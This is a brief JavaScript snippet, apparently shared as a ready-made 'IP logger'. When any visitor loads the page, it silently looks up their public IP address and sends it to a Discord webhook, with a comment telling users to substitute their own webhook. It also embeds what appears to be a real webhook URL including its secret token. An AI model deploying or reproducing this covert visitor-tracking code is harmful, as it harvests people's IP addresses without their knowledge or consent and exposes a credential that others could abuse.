// sefty#0001
async function sendWebhook() {
	let ip = await (await fetch(`https://ifconfig.me/ip`)).text();
	var request = new XMLHttpRequest();
	request.open("POST", "https://discord.com/api/webhooks/1075505438570848407/ucAtH49rDoxMCSelpKbyc9aGjGUHlmw5VxhqialLMXe4EZx7IlRgWv0IouX68WXwQ4bP"); // paste your webhook link there

	request.setRequestHeader('Content-type', 'application/json');

	var params = {
		username: "Website IP Logs",
		avatar_url: "",
		content: `IP: ${ip}`
	};

	request.send(JSON.stringify(params));
};

window.onload = function () { // this will run funcion on page load
	sendWebhook();
};
